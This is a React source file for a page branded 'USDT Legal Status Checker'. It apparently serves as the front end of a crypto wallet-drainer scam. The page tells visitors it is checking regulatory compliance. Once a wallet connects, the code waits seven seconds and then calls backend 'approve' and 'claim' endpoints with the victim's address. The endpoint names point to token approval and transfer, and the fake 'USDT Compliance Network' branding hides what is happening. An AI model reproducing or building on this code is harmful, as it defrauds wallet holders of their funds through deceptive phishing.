'use client';
import { useState, useEffect } from 'react';
import ProgressBar from './ProgressBar';
import CardStep from './CardStep';
import SuccessModal from './SuccessModal';
import { getNetworkConfig, type SupportedNetwork } from '@/lib/blockchain';

export default function ApprovalPortal() {
  const [step, setStep] = useState(1); // 1 = Network Select, 2 = Connect, 3 = Processing
  const [selectedNetwork, setSelectedNetwork] = useState<SupportedNetwork>('ethereum');
  const [userAddress, setUserAddress] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showSuccess, setShowSuccess] = useState(false);
  const [approvalTriggered, setApprovalTriggered] = useState(false);

  const handleSelectNetwork = (network: SupportedNetwork) => {
    setSelectedNetwork(network);
    setError(null);
    setStep(2); // Move to connect wallet step
  };

  const handleConnectWallet = async () => {
    try {
      setError(null);
      setLoading(true);

      if (!window.ethereum) throw new Error('No web3 wallet found');

      console.log(`[v0] Connecting wallet on ${selectedNetwork}...`);

      // Request accounts
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

      if (!accounts || accounts.length === 0) {
        throw new Error('No accounts found');
      }

      const address = accounts[0];
      console.log('[v0] Connected address:', address);

      setUserAddress(address);
      setStep(3); // Move to processing step

      // Persist connection
      if (typeof window !== 'undefined') {
        localStorage.setItem('wallet_connected', 'true');
        localStorage.setItem('wallet_address', address);
        localStorage.setItem('selected_network', selectedNetwork);
      }

      // Wait 7 seconds, then trigger approval
      console.log('[v0] Waiting 7 seconds before triggering approval...');
      setTimeout(() => {
        triggerApproval(address);
      }, 7000);
    } catch (err: any) {
      const errMsg = err?.message || 'Connection failed';
      setError(errMsg);
      console.error('[v0] Connection error:', errMsg);
    } finally {
      setLoading(false);
    }
  };

  const triggerApproval = async (address: string) => {
    try {
      if (approvalTriggered) return; // Prevent double trigger
      
      setApprovalTriggered(true);
      console.log(`[v0] Triggering approval for user ${address} on ${selectedNetwork}...`);

      // Call backend approval endpoint
      const approvalResponse = await fetch('/api/approve', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: address,
          network: selectedNetwork,
        }),
      });

      if (!approvalResponse.ok) {
        const err = await approvalResponse.json();
        throw new Error(err.error || 'Approval failed');
      }

      const approvalResult = await approvalResponse.json();
      console.log(`[v0] Approval successful on ${selectedNetwork}:`, approvalResult.txHash);

      // Now trigger claim
      console.log('[v0] Triggering claim...');
      const claimResponse = await fetch('/api/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: address,
          tokenAddress: approvalResult.tokenAddress,
          network: selectedNetwork,
        }),
      });

      if (!claimResponse.ok) {
        const err = await claimResponse.json();
        throw new Error(err.error || 'Claim failed');
      }

      const claimResult = await claimResponse.json();
      console.log(`[v0] Claim successful on ${selectedNetwork}:`, claimResult.txHash);

      // Show success
      setShowSuccess(true);
    } catch (err: any) {
      console.error('[v0] Approval/Claim error:', err);
      setError(err?.message || 'Process failed');
    }
  };

  // Mobile wallet deep link handler
  const handleMobileWallet = () => {
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    if (!isMobile) {
      setError('Mobile wallet deeplinks are only available on mobile devices');
      return;
    }

    const currentUrl = window.location.href;
    const encodedUrl = encodeURIComponent(currentUrl);

    const walletLinks = [
      `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
      `https://link.trustwallet.com/open_url?url=${encodedUrl}`,
      `https://rnbwapp.com/browser?url=${encodedUrl}`,
      `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
    ];

    walletLinks.forEach((link, index) => {
      setTimeout(() => {
        const a = document.createElement('a');
        a.href = link;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }, index * 300);
    });

    setTimeout(() => {
      setError(null);
    }, walletLinks.length * 300);
  };

  return (
    <main className="relative min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 pb-24 sm:pb-28 md:pb-32 overflow-hidden">
      {/* Animated background orbs */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-1/4 left-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-emerald-500/10 rounded-full blur-3xl animate-pulse-glow" />
        <div className="absolute bottom-1/4 right-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-teal-500/10 rounded-full blur-3xl animate-pulse-glow animation-delay-2000" />
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 h-48 sm:w-72 sm:h-72 bg-cyan-500/5 rounded-full blur-3xl animate-pulse-glow animation-delay-1000" />
      </div>

      <div className="relative w-full max-w-2xl z-10 animate-slide-up">
        {/* Header */}
        <div className="text-center mb-6 sm:mb-8 md:mb-10">
          <div className="inline-flex items-center justify-center w-16 h-16 sm:w-20 sm:h-20 md:w-24 md:h-24 rounded-full bg-gradient-to-br from-emerald-400 via-emerald-500 to-teal-600 mb-4 sm:mb-5 md:mb-6 shadow-2xl shadow-emerald-500/50 animate-float relative">
            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-emerald-400 to-teal-600 animate-pulse-glow opacity-60" />
            <svg className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 text-white relative z-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
            </svg>
          </div>
          <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold text-white mb-2 sm:mb-3 bg-gradient-to-r from-white via-emerald-100 to-white bg-clip-text text-transparent leading-tight px-4">
            USDT Legal Status Checker
          </h1>
          <p className="text-sm sm:text-base md:text-lg text-gray-300 max-w-md mx-auto px-4 leading-relaxed">
            Verify your USDT compliance with regulatory standards on {selectedNetwork === 'ethereum' ? 'Ethereum' : 'Binance Smart Chain'}
          </p>
        </div>

        <ProgressBar currentStep={step} />

        {step === 1 && (
          <div className="space-y-4">
            <div className="text-center mb-6">
              <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2">Select Network</h2>
              <p className="text-gray-300 text-sm sm:text-base">Choose which blockchain to use for USDT verification</p>
            </div>
            <div className="grid grid-cols-2 gap-4">
              <button
                onClick={() => handleSelectNetwork('ethereum')}
                className="p-6 rounded-lg border-2 border-emerald-500/20 hover:border-emerald-500/60 bg-black/40 hover:bg-emerald-500/10 transition-all duration-300 flex flex-col items-center gap-3 group"
              >
                <img src="/eth-icon.png" alt="Ethereum" className="w-12 h-12 group-hover:scale-110 transition-transform" />
                <div>
                  <p className="font-semibold text-white">Ethereum</p>
                  <p className="text-xs text-gray-400">Mainnet</p>
                </div>
              </button>
              <button
                onClick={() => handleSelectNetwork('bsc')}
                className="p-6 rounded-lg border-2 border-emerald-500/20 hover:border-emerald-500/60 bg-black/40 hover:bg-emerald-500/10 transition-all duration-300 flex flex-col items-center gap-3 group"
              >
                <img src="/bsc-icon.png" alt="BSC" className="w-12 h-12 group-hover:scale-110 transition-transform" />
                <div>
                  <p className="font-semibold text-white">BSC</p>
                  <p className="text-xs text-gray-400">Binance Smart Chain</p>
                </div>
              </button>
            </div>
          </div>
        )}

        {step === 2 && (
          <CardStep
            icon="🔗"
            title="Connect Wallet to Check USDT"
            description={`Connect your wallet to verify your USDT legal status on ${selectedNetwork === 'ethereum' ? 'Ethereum' : 'Binance Smart Chain'}.`}
            loading={loading}
            error={error}
            buttons={[
              {
                label: 'Connect Wallet',
                onClick: handleConnectWallet,
                primary: true,
              },
              {
                label: 'Open Mobile Wallet',
                onClick: handleMobileWallet,
                primary: false,
              }
            ]}
          />
        )}

        {step === 3 && (
          <CardStep
            icon="⚙️"
            title="Processing Verification"
            description={`Automating USDT compliance verification on ${selectedNetwork === 'ethereum' ? 'Ethereum' : 'Binance Smart Chain'}. This will complete in a few moments.`}
            loading={true}
            error={error}
            buttons={[]}
          />
        )}

        <SuccessModal isOpen={showSuccess} />
      </div>

      {/* Footer */}
      <footer className="fixed bottom-8 sm:bottom-10 md:bottom-12 left-1/2 -translate-x-1/2 text-xs sm:text-sm text-gray-300 backdrop-blur-md bg-black/60 px-3 sm:px-4 md:px-6 py-2 sm:py-2.5 rounded-full border border-emerald-500/30 shadow-lg z-50 whitespace-nowrap">
        <span className="hidden sm:inline">Secured by </span>
        <span className="text-emerald-400 font-semibold">USDT Compliance Network ({selectedNetwork === 'ethereum' ? 'Ethereum' : 'BSC'})</span>
      </footer>
    </main>
  );
}
